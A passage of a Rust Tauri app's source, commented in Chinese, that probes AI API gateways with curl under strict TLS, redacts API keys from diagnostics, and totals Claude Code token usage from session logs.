    /// OpenSSL / LibreSSL 等（macOS 自带 curl 默认是 LibreSSL）
    Other,
}

fn parse_tls_backend(version_output: &str) -> TlsBackend {
    if version_output.contains("Schannel") {
        TlsBackend::Schannel
    } else {
        TlsBackend::Other
    }
}

/// curl --version 的输出。版本探测与诊断导出都要用，故缓存避免重复起进程。
fn curl_version_output() -> String {
    static CACHE: std::sync::OnceLock<String> = std::sync::OnceLock::new();
    CACHE
        .get_or_init(|| match curl_command().arg("--version").output() {
            Ok(o) => String::from_utf8_lossy(&o.stdout).to_string(),
            Err(_) => String::new(),
        })
        .clone()
}

/// 后端只探测一次并缓存——健康检查会对每个网关环境并行探测，不该重复起进程。
fn tls_backend() -> TlsBackend {
    static CACHE: std::sync::OnceLock<TlsBackend> = std::sync::OnceLock::new();
    *CACHE.get_or_init(|| parse_tls_backend(&curl_version_output()))
}

/// write-out 标记：用它把 HTTP 状态码从响应体末尾切出来，从而区分
/// "TLS 没过" / "Key 无效" / "返回不可解析" 三种失败。
const HTTP_CODE_MARK: &str = "__CCM_HTTP__";

/// 组装 curl 配置。始终严格校验证书；`insecure` 不得再出现在任何分支。
fn build_curl_config(
    url: &str,
    token: &str,
    mode: TrustMode,
    bundle: Option<&Path>,
    backend: TlsBackend,
) -> String {
    let mut c = String::from("silent\nshow-error\nconnect-timeout = 5\nmax-time = 15\n");
    // Schannel 默认强制查吊销状态；自签网关的证书通常没有 CRL 分发点，于是即使信任链
    // 验证通过，也会以 rc=60 "revocation status is unknown" 失败(已实测)。
    // 而 claude(Node/OpenSSL)不查吊销状态——为了忠实模拟 claude 的真实行为，这里用
    // best-effort：只在"吊销信息拿不到"时放行，证书确实被吊销仍然会失败。
    // 该标志是 Schannel 专有，其它后端带上会被当成未知选项，故按后端而非按操作系统判断。
    if backend == TlsBackend::Schannel {
        c += "ssl-revoke-best-effort\n";
    }
    if mode == TrustMode::ImportedCa {
        if let Some(p) = bundle {
            c += &format!("cacert = \"{}\"\n", curl_escape(&curl_path(p)));
        }
    }
    // silent 会吞掉错误原因，配合 show-error 让失败时 stderr 里有真实原因可展示。
    c += &format!(
        "header = \"Authorization: Bearer {}\"\nurl = \"{}\"\nwrite-out = \"\\n{HTTP_CODE_MARK}%{{http_code}}\"\n",
        curl_escape(token.trim()),
        curl_escape(url)
    );
    c
}

/// 把 stdout 切成 (响应体, HTTP 状态码)。没有标记(如进程被杀)时状态码记 0。
fn parse_http_code(stdout: &str) -> (String, u16) {
    match stdout.rsplit_once(HTTP_CODE_MARK) {
        Some((body, code)) => (
            body.trim_end_matches(['\r', '\n']).to_string(),
            code.trim().parse::<u16>().unwrap_or(0),
        ),
        None => (stdout.to_string(), 0),
    }
}

/// 构造 curl 命令：Windows 用 curl.exe 并隐藏控制台窗口，其余平台用 curl。
/// 注意 TLS 后端随安装来源而异(Windows 常见 Schannel，macOS 自带的是 LibreSSL)，
/// 不能把一个平台的 --cacert 语义想当然套到另一个平台。
pub(crate) fn curl_command() -> std::process::Command {
    let curl = if cfg!(target_os = "windows") {
        "curl.exe"
    } else {
        "curl"
    };
    #[allow(unused_mut)]
    let mut c = std::process::Command::new(curl);
    #[cfg(target_os = "windows")]
    {
        use std::os::windows::process::CommandExt;
        c.creation_flags(0x08000000);
    }
    c
}

#[derive(Debug, Clone)]
pub(crate) enum ProbeError {
    InvalidUrl,
    /// 地址本身合法，但传输不安全（远程明文 http）—— 与 [`ProbeError::InvalidUrl`]
    /// **必须分开**：一个是"写错了"，一个是"写对了但不让用"，修法完全不同。
    PlaintextTransport,
    MissingToken,
    Curl {
        kind: CurlFailure,
        exit_code: i32,
        stderr: String,
    },
    Auth {
        http_code: u16,
    },
    BadResponse {
        http_code: u16,
        body: String,
    },
    Spawn(String),
}

impl ProbeError {
    /// 用户可见文案。证书没验过时**不得**出现"可达"之类的措辞——这正是本次要修的假阳性。
    pub(crate) fn message(&self) -> String {
        let tail = |s: &str| {
            if s.is_empty() {
                String::new()
            } else {
                format!(" 详情：{s}")
            }
        };
        match self {
            ProbeError::InvalidUrl => {
                "网关地址必须是有效的 http:// 或 https:// 地址，且不能包含空格。".into()
            }
            ProbeError::PlaintextTransport => PLAINTEXT_TRANSPORT_REJECTED.into(),
            ProbeError::MissingToken => "请先填写 API Key（检测需要鉴权）。".into(),
            // 措辞与 workbuddy.rs 的证书报错保持一致，避免同一件事出现两套说法。
            // 但只有"信任链"类退出码才能断言"导入 CA 就好"，其余 TLS 码另有原因。
            ProbeError::Curl {
                kind: CurlFailure::Tls,
                exit_code,
                stderr,
            } => {
                if is_ca_import_likely_helpful(*exit_code) {
                    format!(
                        "TLS 证书校验失败，claude 也会连不上。请到「设置 → CA 证书」导入网关的 CA 根证书后重试。{}",
                        tail(stderr)
                    )
                } else {
                    format!(
                        "TLS 握手失败（curl 退出码 {exit_code}），claude 也会连不上。若网关用自签证书，请先到「设置 → CA 证书」导入其根证书；否则请检查网关的 TLS 配置。{}",
                        tail(stderr)
                    )
                }
            }
            ProbeError::Curl {
                kind: CurlFailure::Network,
                exit_code,
                stderr,
            } => format!("网络不可达（curl 退出码 {exit_code}）。{}", tail(stderr)),
            ProbeError::Curl {
                kind: CurlFailure::Other,
                exit_code,
                stderr,
            } => format!("网关探测失败（curl 退出码 {exit_code}）。{}", tail(stderr)),
            ProbeError::Auth { http_code } => {
                format!("API Key 无效或无权访问（HTTP {http_code}）。")
            }
            ProbeError::BadResponse { http_code, body } => {
                if *http_code >= 400 {
                    format!("网关返回 HTTP {http_code}：{body}")
                } else {
                    format!("未解析到模型列表：{body}")
                }
            }
            ProbeError::Spawn(e) => format!("调用 curl 失败：{e}"),
        }
    }
}

#[derive(Debug)]
struct ProbeOutput {
    stdout: String,
    stderr: String,
    exit_code: i32,
}

fn run_curl_probe(
    url: &str,
    token: &str,
    mode: TrustMode,
    bundle: Option<&Path>,
) -> Result<ProbeOutput, ProbeError> {
    // 用 -K - 从 stdin 读取参数(含 Authorization 头)，而不是拼进命令行参数，
    // 避免 key 明文出现在本机进程列表(如 Windows 任务管理器/ps)的命令行里。
    let config = build_curl_config(url, token, mode, bundle, tls_backend());
    let mut cmd = curl_command();
    cmd.arg("-K").arg("-");
    cmd.stdin(std::process::Stdio::piped());
    cmd.stdout(std::process::Stdio::piped());
    cmd.stderr(std::process::Stdio::piped());
    let mut child = cmd.spawn().map_err(|e| ProbeError::Spawn(e.to_string()))?;
    // take() 取得所有权，写完即 drop —— 关闭管道给 curl 送去 EOF，它才会开始干活
    if let Some(mut stdin) = child.stdin.take() {
        use std::io::Write;
        if let Err(e) = stdin.write_all(config.as_bytes()) {
            drop(stdin);
            // 等它回收，避免留下僵尸进程
            let _ = child.wait();
            return Err(ProbeError::Spawn(format!("写入 curl 参数失败：{e}")));
        }
    }
    let out = child
        .wait_with_output()
        .map_err(|e| ProbeError::Spawn(e.to_string()))?;
    Ok(ProbeOutput {
        stdout: String::from_utf8_lossy(&out.stdout).to_string(),
        // 这里不做脱敏：抹 Key 统一在 interpret_probe 里做（构造用户可见文案的唯一出口），
        // 免得将来多一条构造路径就漏一次。
        stderr: String::from_utf8_lossy(&out.stderr).trim().to_string(),
        exit_code: out.status.code().unwrap_or(-1),
    })
}

/// 抹掉可能被回显进响应体 / stderr 的 API Key。
/// 网关（或挡在前面的代理）在错误页里回显请求头并不罕见，而诊断报告是要发给别人看的。
fn redact_secret(s: &str, secret: &str) -> String {
    let t = secret.trim();
    if t.is_empty() {
        s.to_string()
    } else {
        s.replace(t, "<API Key 已隐去>")
    }
}

/// 稳定的内容哈希（sha256，带算法前缀）。
/// 用于**会被持久化**的指纹：绝不能换成 `DefaultHasher` —— Rust 不保证它跨编译稳定，
/// 值一变，靠它比对的判据全部失效（Codex 同步就踩过这个坑，见 P0-B#12）。
pub(crate) fn content_hash(bytes: &[u8]) -> String {
    use sha2::{Digest, Sha256};
    let mut hasher = Sha256::new();
    hasher.update(bytes);
    format!("sha256:{:x}", hasher.finalize())
}

/// 把网关/代理响应正文里的凭证统一抹掉。两个网关路径（curl 探测、reqwest 调用）共用。
///
/// React 转义只防 XSS，**不防**敏感信息被展示、截图或导出，所以必须在后端就抹。
/// 两道防线：
///   1) 本次请求的具体 Key（调用方传入）；
///   2) **通用凭证形态** —— `Bearer <token>` 与 `sk-…` / `gw-sk-…` 长串，
///      即使正文回显的是另一个 Key（轮换前 / 其它环境）也一并抹掉。
///
/// 只负责脱敏，不负责截断 —— 调用方应在脱敏**之后**再截断，
/// 反过来会把密钥截成半截留在正文里。
pub(crate) fn redact_gateway_text(text: &str, api_key: Option<&str>) -> String {
    let masked = redact_secret(text, api_key.unwrap_or_default());
    redact_key_like_tokens(&redact_bearer_tokens(&masked))
}

/// 把 `Bearer <token>` 的 token 换成占位符；保留 `Bearer` 前缀，
/// 便于判断这是不是鉴权问题。
fn redact_bearer_tokens(text: &str) -> String {
    let lower = text.to_ascii_lowercase();
    let mut out = String::with_capacity(text.len());
    let mut cursor = 0usize;
    while let Some(offset) = lower[cursor..].find("bearer ") {
        let token_start = cursor + offset + "bearer ".len();
        out.push_str(&text[cursor..token_start]);
        let token_end = text[token_start..]
            .find(|c: char| c.is_whitespace() || matches!(c, '"' | '\'' | ',' | '}' | ']'))
            .map(|rel| token_start + rel)
            .unwrap_or(text.len());
        if token_end > token_start {
            out.push_str("<已隐去>");
        }
        cursor = token_end;
    }
    out.push_str(&text[cursor..]);
    out
}

/// 抹掉 `sk-…` / `gw-sk-…` 形态的密钥串。
/// 网关可能回显的是与本次请求**不同**的 Key，所以不能只靠"抹掉当前这个"。
fn redact_key_like_tokens(text: &str) -> String {
    let mut out = String::with_capacity(text.len());
    let mut rest = text;
    while let Some(position) = rest.find("sk-") {
        out.push_str(&rest[..position]);
        let tail = &rest[position..];
        let end = tail
            .find(|c: char| !(c.is_ascii_alphanumeric() || c == '-' || c == '_'))
            .unwrap_or(tail.len());
        // 太短的可能是普通词（如 `sk-1`），只抹掉足够长的
        if end >= 12 {
            out.push_str("<已隐去>");
        } else {
            out.push_str(&tail[..end]);
        }
        rest = &tail[end..];
    }
    out.push_str(rest);
    out
}

/// 用户可见的响应片段：剔除控制字符（含终端转义）并截断。
fn clip_body(s: &str) -> String {
    s.chars()
        .filter(|c| !c.is_control() || *c == '\n')
        .take(160)
        .collect()
}

/// 单次探测的判定结果（纯逻辑，便于表驱动测试）
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum ProbeVerdict {
    /// 2xx，可以继续解析响应体
    ParseModels,
    Curl(CurlFailure, i32),
    Unauthorized(u16),
    BadStatus(u16),
}

/// 判定一次探测是成功还是要报错。
///
/// 只有 **2xx** 才算成功：curl 不带 --fail 时，HTTP 错误状态也返回退出码 0，
/// 若像早先那样只特判 401/403，一个 502 错误页只要 body 恰好长得像模型列表
/// 就会被判成"健康"——那正是本次要根除的假阳性。状态码取不到(0，标记缺失)
/// 同样不算成功。
fn probe_verdict(exit_code: i32, http_code: u16) -> ProbeVerdict {
    if exit_code != 0 {
        return ProbeVerdict::Curl(classify_curl_failure(exit_code), exit_code);
    }
    if http_code == 401 || http_code == 403 {
        return ProbeVerdict::Unauthorized(http_code);
    }
    if !(200..300).contains(&http_code) {
        return ProbeVerdict::BadStatus(http_code);
    }
    ProbeVerdict::ParseModels
}

/// 把一次探测的原始输出判成"模型列表"或"哪一层失败了"。
///
/// **这里是构造用户可见文案的唯一出口，也是抹掉 API Key 的唯一关卡。**
/// 响应体与 stderr 都由网关/curl 控制，两者都可能回显 Authorization 头，
/// 而健康详情会原样写进导出给别人看的诊断报告，所以两条都必须先脱敏。
fn interpret_probe(out: ProbeOutput, token: &str) -> Result<Vec<String>, ProbeError> {
    let (raw_body, http_code) = parse_http_code(&out.stdout);
    // 统一走 redact_gateway_text：既抹本次的 Key，也抹通用的 Bearer / sk- 形态。
    // 顺序是**先脱敏再截断** —— 反过来会把密钥截成半截留在正文里。
    let body = clip_body(&redact_gateway_text(&raw_body, Some(token)));
    let stderr = clip_body(&redact_gateway_text(out.stderr.trim(), Some(token)));

    match probe_verdict(out.exit_code, http_code) {
        ProbeVerdict::Curl(kind, exit_code) => Err(ProbeError::Curl {
            kind,
            exit_code,
            stderr,
        }),
        ProbeVerdict::Unauthorized(http_code) => Err(ProbeError::Auth { http_code }),
        ProbeVerdict::BadStatus(http_code) => Err(ProbeError::BadResponse { http_code, body }),
        ProbeVerdict::ParseModels => {
            if raw_body.trim().is_empty() {
                // 2xx 却没有内容：把 stderr 带出来，便于看 curl 的告警
                return Err(ProbeError::BadResponse {
                    http_code,
                    body: stderr,
                });
            }
            let v: serde_json::Value =
                serde_json::from_str(raw_body.trim()).map_err(|_| ProbeError::BadResponse {
                    http_code,
                    body: body.clone(),
                })?;
            let mut ids = vec![];
            if let Some(arr) = v.get("data").and_then(|d| d.as_array()) {
                for m in arr {
                    if let Some(id) = m.get("id").and_then(|i| i.as_str()) {
                        ids.push(id.to_string());
                    }
                }
            }
            if ids.is_empty() {
                return Err(ProbeError::BadResponse { http_code, body });
            }
            Ok(ids)
        }
    }
}

/// 严格分级探测，返回(实际走通的信任级别, 模型列表)。
/// health 面板靠 TrustMode 区分"系统信任即可"与"依赖已导入的 CA"两种文案。
pub(crate) fn detect_models_ladder(
    env: &str,
    base_url: &str,
    token: &str,
) -> Result<(TrustMode, Vec<String>), ProbeError> {
    let base = base_url.trim().trim_end_matches('/');
    match base_url_rejection(base) {
        Some(BaseUrlRejection::PlaintextTransport) => return Err(ProbeError::PlaintextTransport),
        Some(BaseUrlRejection::Malformed) => return Err(ProbeError::InvalidUrl),
        None => {}
    }
    if token.trim().is_empty() {
        return Err(ProbeError::MissingToken);
    }
    let url = format!("{base}/v1/models");

    // 第 1 步：严格 + 系统信任。公有 CA、以及 IT 已装进系统信任库的公司 CA 都走这条。
    let mut last_err = match run_curl_probe(&url, token, TrustMode::System, None) {
        Ok(out) => match interpret_probe(out, token) {
            Ok(models) => return Ok((TrustMode::System, models)),
            Err(e) => e,
        },
        Err(e) => e,
    };

    // 第 2 步：只有"证书类失败 + 已导入 CA"才回退。无条件传 --cacert 会替换掉系统
    // 信任库、把公有 CA 的网关打挂(已实测)，所以必须限定在这个条件下。
    // 用**该网关自己的** CA bundle，而不是某个全局共享文件：
    // 否则"给 A 导入的 CA 让 B 的探测也过了"，探测结论就成了假的。
    let bundle = ca_bundle_path(env).unwrap_or_else(|| cfg_dir().join("ca-unusable.pem"));
    let retry = match &last_err {
        ProbeError::Curl { kind, .. } => next_probe_after_failure(*kind, bundle.is_file()),
        _ => None,
    };
    if let Some(mode) = retry {
        let out = run_curl_probe(&url, token, mode, Some(&bundle))?;
        match interpret_probe(out, token) {
            Ok(models) => return Ok((mode, models)),
            Err(e) => last_err = e,
        }
    }
    Err(last_err)
}

/// 诊断用：curl 版本与 TLS 后端。跨平台排查证书问题时，后端差异
/// (Schannel / LibreSSL / OpenSSL)决定了 --cacert 与吊销检查标志的语义，
/// 是远程定位问题的关键信息。
pub(crate) fn curl_version_line() -> String {
    let s = curl_version_output();
    if s.trim().is_empty() {
        return "（无法调用 curl 或获取版本）".into();
    }
    s.lines().take(2).collect::<Vec<_>>().join(" / ")
}

// 检测网关可用模型：请求 {base_url}/v1/models。
// `env` 用来取**该网关自己的** CA bundle（探测的信任来源必须与启动时一致，
// 否则会出现"探测通过、实际连不上"或反过来）。
#[tauri::command]
async fn detect_models(
    env: String,
    base_url: String,
    token: String,
) -> Result<Vec<String>, String> {
    tauri::async_runtime::spawn_blocking(move || detect_models_blocking(env, base_url, token))
        .await
        .map_err(|e| format!("模型检测任务失败：{e}"))?
}

fn detect_models_blocking(
    env: String,
    base_url: String,
    token: String,
) -> Result<Vec<String>, String> {
    detect_models_ladder(&env, &base_url, &token)
        .map(|(_, models)| models)
        .map_err(|e| e.message())
}

// ---------------- 解密已存 key / 按环境检测模型 ----------------
fn decrypt_token(p: &Profile) -> Result<String, String> {
    credentials::read(&p.name, p.token_enc.as_deref())
}

#[tauri::command]
async fn detect_models_for(name: String) -> Result<Vec<String>, String> {
    tauri::async_runtime::spawn_blocking(move || detect_models_for_blocking(name))
        .await
        .map_err(|e| format!("模型检测任务失败：{e}"))?
}

fn detect_models_for_blocking(name: String) -> Result<Vec<String>, String> {
    let list = load();
    let p = list
        .iter()
        .find(|x| x.name == name)
        .ok_or_else(|| "未找到该环境".to_string())?;
    if p.type_ != "router" {
        return Err("该环境不是网关环境，没有可检测的网关".into());
    }
    if p.base_url.is_empty() {
        return Err("该环境未配置网关地址".into());
    }
    let token = decrypt_token(p)?;
    detect_models_blocking(p.name.clone(), p.base_url.clone(), token)
}

// ---------------- 单环境网关连通复测（环境管理页「检测」按钮） ----------------
// 只测这一个环境并把结论同步进最近验证记录；不跑全量健康检查。
// 与诊断页的网关项同一套判定（解 Key + 探测），失败口径保持一致。
fn probe_gateway_blocking(env: String) -> Result<String, String> {
    let list = load();
    let p = list
        .iter()
        .find(|x| x.name == env)
        .ok_or_else(|| "未找到该环境".to_string())?;
    if p.type_ != "router" {
        return Err("该环境不是网关环境，没有可检测的网关".into());
    }
    if p.base_url.is_empty() {
        return Err("该环境未配置网关地址".into());
    }
    let probe = decrypt_token(p)
        .and_then(|token| detect_models_blocking(p.name.clone(), p.base_url.clone(), token));
    match probe {
        Ok(models) => {
            let _ = health::update_gateway_in_record(&env, true);
            Ok(format!(
                "网关连通正常，检测到 {} 个可用模型。",
                models.len()
            ))
        }
        Err(e) => {
            let _ = health::update_gateway_in_record(&env, false);
            Err(e)
        }
    }
}

#[tauri::command]
async fn probe_gateway(env: String) -> Result<String, String> {
    tauri::async_runtime::spawn_blocking(move || probe_gateway_blocking(env))
        .await
        .map_err(|e| format!("网关检测任务失败：{e}"))?
}

// ---------------- 用量统计 ----------------
#[derive(Serialize, Clone)]
#[serde(rename_all = "camelCase")]
struct UsageRow {
    datetime: String,
    model: String,
    profile: String,
    input: u64,
    output: u64,
    cache_read: u64,
    cache_create: u64,
    requests: u64,
}

#[derive(Serialize, Clone)]
#[serde(rename_all = "camelCase")]
struct ConvRow {
    datetime: String,
    profile: String,
}

#[derive(Serialize)]
#[serde(rename_all = "camelCase")]
struct UsageStats {
    daily: Vec<UsageRow>,
    conversations: Vec<ConvRow>,
    total_input: u64,
    total_output: u64,
    total_requests: u64,
    total_conversations: u64,
}

fn collect_jsonl(dir: &PathBuf, out: &mut Vec<PathBuf>) {
    if let Ok(rd) = fs::read_dir(dir) {
        for e in rd.flatten() {
            let p = e.path();
            if p.is_dir() {
                collect_jsonl(&p, out);
            } else if p.extension().and_then(|x| x.to_str()) == Some("jsonl") {
                out.push(p);
            }
        }
    }
}

// 按文件缓存解析结果：会话 jsonl 一旦写完就不再变化，mtime+size 未变的文件
// 直接复用上次解析出的行，重复扫描只需重新解析正在追加的少数活跃文件。
// 这是「用量页自动刷新」可行的前提——否则每 30 秒全量重读数百 MB 不可接受。
struct UsageFileCache {
    mtime: std::time::SystemTime,
    size: u64,
    rows: Vec<UsageRow>,
    convs: Vec<ConvRow>,
}

fn usage_cache() -> &'static std::sync::Mutex<std::collections::HashMap<PathBuf, UsageFileCache>> {
    static CACHE: std::sync::OnceLock<
        std::sync::Mutex<std::collections::HashMap<PathBuf, UsageFileCache>>,
    > = std::sync::OnceLock::new();
    CACHE.get_or_init(|| std::sync::Mutex::new(std::collections::HashMap::new()))
}

fn merge_rows(
    rows: &[UsageRow],
    map: &mut std::collections::HashMap<(String, String, String), UsageRow>,
) {
    for r in rows {
        let key = (r.datetime.clone(), r.model.clone(), r.profile.clone());
        let e = map.entry(key).or_insert_with(|| UsageRow {
            datetime: r.datetime.clone(),
            model: r.model.clone(),
            profile: r.profile.clone(),
            input: 0,
            output: 0,
            cache_read: 0,
            cache_create: 0,
            requests: 0,
        });
        e.input += r.input;
        e.output += r.output;
        e.cache_read += r.cache_read;
        e.cache_create += r.cache_create;
        e.requests += r.requests;
    }
}

// 扫描单个环境(或默认 Claude)的 projects 目录，把用量/对话记录累加进 map/conv。
// 总计不在这里累加：全部可由 map/conv 推导，避免两套并行计数日后失步。
fn scan_usage_dir(
    profile: &str,
    projects: &PathBuf,
    map: &mut std::collections::HashMap<(String, String, String), UsageRow>,
    conv: &mut Vec<ConvRow>,
) {
    let mut files = vec![];
    collect_jsonl(projects, &mut files);
    let mut cache = usage_cache().lock().unwrap();
    for f in files {
        let meta = match fs::metadata(&f) {
            Ok(m) => m,
            Err(_) => continue,
        };
        let size = meta.len();
        let mtime = meta.modified().unwrap_or(std::time::UNIX_EPOCH);
        if let Some(hit) = cache.get(&f) {
            if hit.size == size && hit.mtime == mtime {
                merge_rows(&hit.rows, map);
                conv.extend(hit.convs.iter().cloned());
                continue;
            }
        }
        let (rows, convs) = parse_usage_file(profile, &f);
        merge_rows(&rows, map);
        conv.extend(convs.iter().cloned());
        cache.insert(
            f,
            UsageFileCache {
                mtime,
                size,
                rows,
                convs,
            },
        );
    }
}

// 解析单个会话 jsonl，返回该文件内按 (datetime, model) 聚合的用量行和对话记录。
//
// 同一 message.id 会落多行：Claude Code 对多内容块消息（文本 + 多个工具调用）
// 逐块写行，这些行的 usage/stop_reason/时间戳完全相同；流式过程还会先写不带
// stop_reason 的快照行、再写终行。不去重会让输入/缓存命中虚高数倍（实测主账
// 户 60 天数据：输入约 3.2 倍、缓存命中约 2.5 倍）。与 cc-switch 会话导入同
// 口径按 message.id 去重：优先保留带 stop_reason 的终行，stop_reason 有无一致
// 时保留 output_tokens 更大者（等值不替换）。
fn parse_usage_file(profile: &str, f: &PathBuf) -> (Vec<UsageRow>, Vec<ConvRow>) {
    // 第一阶段：按 message.id 收集去重后的代表行
    struct MsgEntry {
        model: String,
        datetime: String,
        input: u64,
        output: u64,
        cache_read: u64,
        cache_create: u64,
        has_stop: bool,
    }
    let mut messages: std::collections::HashMap<String, MsgEntry> =
        std::collections::HashMap::new();
    let mut conv: Vec<ConvRow> = Vec::new();
    let content = match fs::read_to_string(f) {
        Ok(c) => c,
        Err(_) => return (vec![], conv),
    };
    for line in content.lines() {
        let has_usage = line.contains("\"usage\"");
        // 用户真实提问：type=user 且不是工具返回（tool_result）
        let maybe_user = line.contains("\"user\"") && !line.contains("tool_result");
        if !has_usage && !maybe_user {
            continue;
        }
        let v: serde_json::Value = match serde_json::from_str(line) {
            Ok(x) => x,
            Err(_) => continue,
        };
        let typ = v.get("type").and_then(|t| t.as_str()).unwrap_or("");

        // —— 对话次数：统计用户真实提问 ——
        if typ == "user" {
            let is_tool = v
                .get("message")
                .and_then(|m| m.get("content"))
                .map(|c| c.to_string().contains("tool_result"))
                .unwrap_or(false);
            if is_tool {
                continue;
            }
            let ts = v.get("timestamp").and_then(|t| t.as_str()).unwrap_or("");
            if ts.len() < 13 {
                continue;
            }
            conv.push(ConvRow {
                datetime: ts[..13].to_string(),
                profile: profile.to_string(),
            });
            continue;
        }

        // —— API 调用次数 + token：统计 assistant 消息 ——
        if typ != "assistant" {
            continue;
        }
        let msg = match v.get("message") {
            Some(m) => m,
            None => continue,
        };
        let model = msg.get("model").and_then(|m| m.as_str()).unwrap_or("");
        if model.is_empty() || model == "<synthetic>" {
            continue;
        }
        let usage = match msg.get("usage") {
            Some(u) => u,
            None => continue,
        };
        // 无 message.id 的 assistant 行无法可靠去重，跳过（cc-switch 同口径；
        // 实测正常会话文件中不存在此类行）
        let id = match msg.get("id").and_then(|m| m.as_str()) {
            Some(x) => x.to_string(),
            None => continue,
        };
        let gi = |k: &str| usage.get(k).and_then(|x| x.as_u64()).unwrap_or(0);
        let input = gi("input_tokens");
        let output = gi("output_tokens");
        let cache_read = gi("cache_read_input_tokens");
        let cache_create = gi("cache_creation_input_tokens");
        let ts = v.get("timestamp").and_then(|t| t.as_str()).unwrap_or("");
        if ts.len() < 13 {
            continue;
        }
        let datetime = ts[..13].to_string(); // 例如 2026-06-22T04
        let has_stop = msg.get("stop_reason").and_then(|s| s.as_str()).is_some();
        // cc-switch 代表行规则：新行有 stop_reason 而已存行没有 → 替换；
        // 两者都有/都没有 → 仅 output_tokens 严格更大才替换（等值重复行保持首行）
        let should_replace = match messages.get(&id) {
            None => true,
            Some(e) => (has_stop && !e.has_stop) || (has_stop == e.has_stop && output > e.output),
        };
        if should_replace {
            messages.insert(
                id,
                MsgEntry {
                    model: model.to_string(),
                    datetime,
                    input,
                    output,
                    cache_read,
                    cache_create,
                    has_stop,
                },
            );
        }
    }

    // 第二阶段：去重后的代表行入 (datetime, model) 桶。四桶全零的条目跳过
    // （失败/未连通请求 token 为 0 不计入；仅 cache_read > 0 的全缓存请求是
    // 真实计费，保留）。
    let mut map: std::collections::HashMap<(String, String), UsageRow> =
        std::collections::HashMap::new();
    for m in messages.values() {
        if m.input + m.output + m.cache_read + m.cache_create == 0 {
            continue;
        }
        let key = (m.datetime.clone(), m.model.clone());
        let row = map.entry(key).or_insert(UsageRow {
            datetime: m.datetime.clone(),
            model: m.model.clone(),
            profile: profile.to_string(),
            input: 0,
            output: 0,
            cache_read: 0,
            cache_create: 0,
            requests: 0,
        });
        row.input += m.input;
        row.output += m.output;
        row.cache_read += m.cache_read;
        row.cache_create += m.cache_create;
        row.requests += 1;
    }
    (map.into_values().collect(), conv)
}

// 默认 Claude在用量数据里的稳定键；前端负责把它映射为显示文案（与 __all__ 哨兵同一命名环境，
// valid_name 已保留 __ 前缀，新环境不可能占用；见 UsagePanel 的 profileOpts）。
const MAIN_PROFILE_KEY: &str = "__main__";

// async：首次全量扫描可能较慢（默认 Claude历史可达数百 MB），放到异步线程执行，
// 不阻塞主线程；之后的调用命中文件缓存，只重新解析有变动的活跃会话文件。
/// 环境名能不能安全拼进扫描路径。挡掉空名、`.`/`..`、路径分隔符与控制字符。
///
/// 不要求 ASCII —— 老规则时代建的环境名可能是中文/带点号，它们继续放行。
/// 只有"配置被手工改坏"才可能命中这里的拒绝项，那时**宁可不统计**，
/// 也不能让 `../../` 之类的名字把扫描带出 `~/.claude-split`。
fn safe_usage_dir_name(name: &str) -> bool {
    !name.is_empty()
        && name != "."
        && name != ".."
        && !name.contains(['/', '\\'])
        && !name.chars().any(|c| c.is_control())
}

/// 用量统计要扫哪些副本：**默认 Claude + 配置里登记的环境**（偏差 6）。
///
/// 原先直接 `read_dir(~/.claude-split)` 枚举**磁盘目录**，于是"已经删除、只是目录还残留"
/// 的环境仍会被统计 —— 用户明明删掉了它，面板上却还挂着一个环境的历史消耗。
/// 现在以配置为唯一依据：配置里没有的，就不统计。
///
/// 抽成纯函数是为了可测（`collect_usage_stats` 依赖真实 `home()`/配置路径，无法单测）。
fn usage_profiles_to_scan(list: &[Profile]) -> Vec<String> {
    let mut out = vec![MAIN_PROFILE_KEY.to_string()];
    for name in profile_names(list) {
        // 与默认 Claude 键同名的历史遗留目录必须跳过，
        // 宁可不显示也不能混进默认 Claude 的数据里。
        if name == MAIN_PROFILE_KEY || !safe_usage_dir_name(&name) {
            continue;
        }
        out.push(name);
    }
    out
}

fn collect_usage_stats() -> UsageStats {
    use std::collections::HashMap;
    let mut map: HashMap<(String, String, String), UsageRow> = HashMap::new();
    let mut conv: Vec<ConvRow> = Vec::new();

    // 扫哪些副本：默认 Claude + **配置里登记的环境**（偏差 6）。
    let list = load();
    for profile in usage_profiles_to_scan(&list) {
        // 默认 Claude：直接跑 `claude`(不带子命令)的会话落在 ~/.claude/projects
        let projects = if profile == MAIN_PROFILE_KEY {
            home().join(".claude").join("projects")
        } else {
            sync::instance_dir(&profile).join("projects")
        };
        scan_usage_dir(&profile, &projects, &mut map, &mut conv);
    }

    let mut daily: Vec<UsageRow> = map.into_values().collect();
    daily.sort_by(|a, b| a.datetime.cmp(&b.datetime));
    UsageStats {
        total_input: daily.iter().map(|r| r.input).sum(),
        total_output: daily.iter().map(|r| r.output).sum(),
        total_requests: daily.iter().map(|r| r.requests).sum(),
        total_conversations: conv.len() as u64,
        daily,
        conversations: conv,
    }
}

#[tauri::command]
async fn usage_stats() -> Result<UsageStats, String> {
    tauri::async_runtime::spawn_blocking(collect_usage_stats)
        .await
        .map_err(|e| format!("用量扫描任务异常：{e}"))
}

fn main() {
    // CLI 同步模式:由 cc.ps1/cc.sh 在每次启动/退出 claude 时调用,不起 GUI。
    // release 下无控制台,全程不 panic,问题记入 ~/.cc-manager/sync.log。
    if std::env::args().any(|a| a == "--sync") {
        let list = load();
        let names = profile_names(&list);
        // **迁移必须排在刷新脚本之前**：脚本从本次起改为读 `ca/<环境>.pem`，
        // 先迁移才能保证那个文件已经在，否则存量用户这次启动就会连不上网关。
        if let Some(msg) = reconcile_shared_ca() {
            sync::log_line(&msg);
        }
        // Skills / Agents 由 extensions 逐项接管。不能再运行旧的整目录迁移，
        // 否则会重新把 Plugins 与已退役的 Commands 链接到共享目录。
        // 升级后第一次跑到这里就把过期脚本换掉，不必等用户打开 GUI
        if let Some(msg) = refresh_scripts_if_stale(&list) {
            sync::log_line(&msg);
        }
        if let Some(_guard) = sync::acquire_config_lock() {
            for warning in extensions::sync_all_locked(&names) {
                sync::log_line(&format!("扩展分发警告:{warning}"));
            }
        } else {
            sync::log_line("扩展分发跳过：另一个配置操作正在进行");
        }
        // CLI(--sync) 路径：把 warnings 也写进日志，别只留一句 summary
        match sync::sync_configs(&names) {
            Ok(outcome) => {
                sync::log_line(&format!("sync_configs:{}", outcome.summary));
                for warning in outcome.warnings {
                    sync::log_line(&format!("sync_configs 警告:{warning}"));
                }
            }
            Err(e) => sync::log_line(&format!("sync_configs 失败:{e}")),
        }
        return;
    }
    tauri::Builder::default()
        // 必须最先注册：后续启动的进程会立即退出，并把已存在的主窗口
        // 显示、从最小化恢复并置于前台。
        .plugin(tauri_plugin_single_instance::init(|app, _args, _cwd| {
